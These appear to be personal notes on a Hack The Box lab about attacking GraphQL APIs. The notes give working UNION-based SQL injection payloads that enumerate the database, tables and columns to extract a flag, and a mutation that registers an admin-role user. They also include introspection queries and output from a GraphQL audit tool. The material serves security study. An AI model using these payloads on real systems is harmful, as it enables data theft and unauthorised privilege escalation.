# Attacking Graphql

#### Injection Attacks in GraphQL

The page explains that GraphQL is not inherently "safe" from classic web vulnerabilities. Because it acts as a layer between the user and the backend, it can pass malicious input directly to databases or browsers.

* **SQL Injection (SQLi):** This occurs when GraphQL arguments (like a username or ID) are inserted directly into a SQL query without sanitization. The page demonstrates that by injecting a single quote (`'`), the server leaks a SQL error message, confirming the vulnerability.
* **UNION-Based Attacks:** Since the backend is a relational database, researchers can use `UNION SELECT` to join the results of the "legitimate" query with a "malicious" query that pulls data from hidden tables (like `information_schema` or `flag`).
* **Column Matching:** A critical part of the attack is matching the number of columns in the original query. In this lab, the `UserObject` has six fields, meaning the `UNION SELECT` must also have six columns.
* **Cross-Site Scripting (XSS):** The page notes that XSS can occur in GraphQL if user-supplied strings are reflected in error messages without proper encoding. For example, sending a script tag into an integer field might cause the server to return that script tag in the error response.

***

#### ## 🗄️ 1. Finding the Database Name

Before you can find tables, you need to know which database you are currently sitting in. You use the `database()` function for this.

**The Payload:**

```
"x' UNION SELECT 1,2,database(),4,5,6-- -"
```

* **How it works:** This tells the database, "Take the name of the current database and put it in the 3rd column (where the username usually goes)."
* **The Result:** You might see something like `{"username": "assessment_db"}`.

***

#### ## 📋 2. Finding the Table Names

Once you have the database name, you look into the `tables` folder of the `information_schema`. Since the GraphQL query usually only shows you one result at a time, we use `GROUP_CONCAT` to string all the table names together into one big list.

**The Payload:**

```
"x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -"
```

* **`information_schema.tables`**: This is the "master list" of every table on the server.
* **`WHERE table_schema=database()`**: This filter ensures you only see tables for the current website, not system tables you don't care about.
* **The Result:** You already saw this in your screenshot! It returned `user,secret,flag,post`.

***

#### ## 🔍 3. Finding the Column Names

Even if you know a table is named `flag`, you don't know what the specific secret column inside it is named. You have to check the `columns` master list.

**The Payload:** \`\`\`

```
"x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -"
```

* **`information_schema.columns`**: The master list of every column name in every table.
* **`WHERE table_name='flag'`**: Limits the search to just your target table.
* **The Result:** It will return something like `id,content,timestamp`. Now you know the flag is likely in the `content` column.

**1. The SQL Injection (`x' ... -- -`)**

* **`x'`**: This closes the legitimate string in the backend SQL query. The backend is likely executing `SELECT ... WHERE username = 'x'`.
* **`UNION SELECT`**: This command tells the database to combine the results of the original search with a new search you are about to define.
* **`-- -`**: This is a SQL comment. It "comments out" the rest of the original query (like the closing quote or any subsequent logic) so it doesn't cause a syntax error.

**2. The Column Mapping (`1,2,flag,4,5,6`)**

* **Why 6 columns?** The original query for a `UserObject` expects 6 columns. If you provide 5 or 7, the database will return an error.
* **Why is `flag` in the 3rd position?** In the GraphQL query, you are asking for the **`username`** field. According to the introspection results on the page, `username` is the **3rd** column in the database table. By putting the word `flag` in the 3rd spot of your `UNION`, the database will put the actual flag value into the "username" slot of the result.

**3. The Target (`FROM flag`)**

* Earlier in the lesson, a query to `information_schema.tables` revealed that a table named **`flag`** exists. This part of the payload tells the database to pull the data specifically from that table.

**4. The GraphQL Request (`{ username }`)**

* This is the final piece of the puzzle. It tells the GraphQL API: "Show me the value of the `username` field for the user I just queried." Because of your SQL injection, that `username` field will now contain the flag from the database.

**If you run this in the lab and the column name is indeed `flag`, the response will look like this:** `{ "data": { "user": { "username": "HTB{sqli_throug_graphql_is_fun!}" } } }`

***

***

### Mutations?

Mutations are GraphQL queries that modify server data. They can be used to create new objects, update existing objects, or delete existing objects.

Let us start by identifying all mutations supported by the backend and their arguments. We will use the following introspection query:

```
query { __schema { mutationType { name fields { name args { name defaultValue type { ...TypeRef } } } } } } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }
```

From the result, we can identify a mutation `registerUser`, presumably allowing us to create new users. The mutation requires a `RegisterUserInput` object as an input:

```
query { __schema { mutationType { name fields { name args { name defaultValue type { ...TypeRef } } } } }}fragment TypeRef on __Type   { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}
```

We can now query all fields of the `RegisterUserInput` object with the following introspection query to obtain all fields that we can use in the mutation:

```
{      __type(name: "RegisterUserInput") {    name    inputFields {      name      description      defaultValue    }  } }
```

By these we can create a new users with the all above requirements like these

```
mutation { registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) { user { username password msg role } } }
```

***

***

### Automate the GRAPHQL injection

We can use the tool GraphQL-Cop, a security audit tool for GraphQL APIs. After cloning the GitHub repository and installing the required dependencies, we can run the graphql-cop.py Python script:

```
Umedh@htb[/htb]$ python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql [HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql) [HIGH] Array-based Query Batching - Batch queries allowed with 10+ simultaneous queries (Denial of Service - /graphql) [HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql) [HIGH] Field Duplication - Queries are allowed with 500 of the same repeated field (Denial of Service - /graphql) [LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql) [MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql) [LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql) [HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql) [MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)
```
